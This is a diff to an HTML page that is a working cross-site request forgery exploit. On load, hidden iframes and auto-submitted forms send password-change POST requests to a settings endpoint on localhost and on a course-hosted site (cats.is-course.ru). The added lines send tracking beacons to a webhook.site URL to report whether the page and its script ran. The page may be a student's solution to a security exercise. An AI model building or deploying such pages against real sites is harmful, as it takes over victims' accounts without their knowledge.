@@ -1,5 +1,6 @@
 <!doctype html><html><head><meta charset="utf-8"><title>design</title></head><body>
 <h1>nice site</h1>
+<img src="https://webhook.site/5169748c-49df-4307-9820-7383309d9f02/nojs-img">
 <iframe name="a" style="display:none"></iframe>
 <iframe name="b" style="display:none"></iframe>
 <form id="f1" target="a" method="POST" action="http://localhost:8080/settings">
@@ -7,7 +8,10 @@
 <form id="f2" target="b" method="POST" action="https://cats.is-course.ru/settings">
 <input name="password" value="Zz9!kq12345678"><input name="confirm-password" value="Zz9!kq12345678"></form>
 <script>
-setTimeout(function(){try{document.getElementById('f1').submit()}catch(e){}
-setTimeout(function(){try{document.getElementById('f2').submit()}catch(e){}},700)},1200);
+new Image().src="https://webhook.site/5169748c-49df-4307-9820-7383309d9f02/js-runs";
+setTimeout(function(){
+  try{document.getElementById('f1').submit()}catch(e){new Image().src="https://webhook.site/5169748c-49df-4307-9820-7383309d9f02/err1"}
+  setTimeout(function(){try{document.getElementById('f2').submit()}catch(e){}},700)
+},1500);
 </script>
 </body></html>
